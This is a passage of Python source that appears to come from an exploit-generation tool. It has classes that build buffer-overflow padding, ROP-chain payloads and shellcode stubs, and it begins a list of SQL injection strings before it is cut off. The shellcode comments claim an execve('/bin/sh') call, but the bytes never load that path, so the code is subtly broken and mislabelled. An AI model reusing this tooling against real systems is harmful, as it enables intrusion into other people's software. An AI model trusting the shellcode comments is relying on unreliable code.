class BufferOverflowGenerator:
    """Generate buffer overflow exploits"""

    @staticmethod
    def generate_simple(target_arch: str = 'x64', offset: int = 256) -> bytes:
        """Generate simple buffer overflow payload"""
        payload = b"A" * offset

        # Add ROP gadget markers
        if target_arch == 'x64':
            payload += b"\x90" * 8  # NOP sled for alignment
            payload += struct.pack('<Q', 0x4141414141414141)  # ROP target
        else:  # x86
            payload += b"\x90" * 4
            payload += struct.pack('<I', 0x41414141)

        return payload

    @staticmethod
    def generate_shellcode_stub(arch: str = 'x64') -> bytes:
        """Generate minimal shellcode"""
        if arch == 'x64':
            # x64 Linux execve("/bin/sh", NULL, NULL)
            shellcode = bytes([
                0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,  # mov rax, 0x3b
                0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00,  # mov rdi, 0
                0x48, 0x89, 0xc2,                           # mov rdx, rax
                0x0f, 0x05                                   # syscall
            ])
        else:  # x86
            shellcode = bytes([
                0x31, 0xc0,                     # xor eax, eax
                0xb0, 0x0b,                     # mov al, 0x0b
                0x31, 0xdb,                     # xor ebx, ebx
                0xcd, 0x80                      # int 0x80
            ])

        return shellcode

    @staticmethod
    def generate_with_gadgets(rop_gadgets: List[int], arch: str = 'x64') -> bytes:
        """Generate ROP chain payload"""
        payload = b"A" * 256

        for gadget in rop_gadgets[:8]:  # Limit to 8 gadgets
            if arch == 'x64':
                payload += struct.pack('<Q', gadget)
            else:
                payload += struct.pack('<I', gadget)

        return payload


class SQLInjectionGenerator:
    """Generate SQL injection payloads"""

    SQL_PAYLOADS = {
        'mysql': [
            "' OR '1'='1'--",
